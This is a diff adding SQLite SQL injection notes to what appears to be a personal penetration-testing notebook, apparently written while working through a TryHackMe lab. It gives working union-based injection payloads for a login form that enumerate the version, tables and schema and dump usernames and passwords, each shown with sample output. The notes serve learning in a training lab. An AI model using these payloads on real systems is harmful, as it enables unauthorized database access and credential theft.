@@ -60,3 +60,102 @@ ffuf -request req.txt -u http://10.10.128.5/ -w ~/Tools/SecLists/Usernames/xato-
 ```
 ![[Pasted image 20230903233728.png]]
 NOTE:- we might need to pass -u with url to use http or https
+
+
+### SQLITE Sql injection
+
+Useful link to follow:-
+https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
+https://tryhackme.com/room/unstabletwin#
+
+##### 1st step SIMPLE ENUM
+
+```sqlite
+username=admin&password=aa'union select 1,sqlite_version() -- -
+```
+
+```json
+[
+  [
+    1, 
+    "3.26.0"
+  ]
+]
+
+```
+
+##### 2nd step  TABLE NAME EXTRACTION
+
+```
+username=admin&password=aa'union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- -
+```
+
+```json
+[
+  [
+    1, 
+    "users,notes"
+  ]
+]
+
+```
+
+##### 3rd step COLUMN NAME EXTRACTION
+
+```sqlite
+username=admin&password=aa'union select 1,sql from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name='notes' limit 3 -- -
+```
+
+```sql
+[
+	[
+		1,
+		"CREATE TABLE notes ( id INTEGER UNIQUE, user_id INTEGER, note_sql INTEGER, notes TEXT,PRIMARY KEY( id ))"
+	]
+]
+```
+
+
+##### 4rd step DATA EXTRACTION FROM COLUMN
+
+```sqlite
+username=admin&password=aa'union select 1,username from users limit 10 -- -
+```
+
+```json
+[
+  [
+    1, 
+    "julias"
+  ], 
+  [
+    1, 
+    "linda"
+  ], 
+  [
+    1, 
+    "marnie"
+  ], 
+  [
+    1, 
+    "mary_ann"
+  ], 
+  [
+    1, 
+    "vincent"
+  ]
+]
+```
+
+```sqlite
+username=admin&password=aa'union select (group_concat(password)),(group_concat(username)) from users limit 1 -- -
+```
+
+```json
+[
+  [
+    "continue...,Red,Orange,Green,Yellow ", 
+    "mary_ann,julias,vincent,linda,marnie"
+  ]
+]
+```
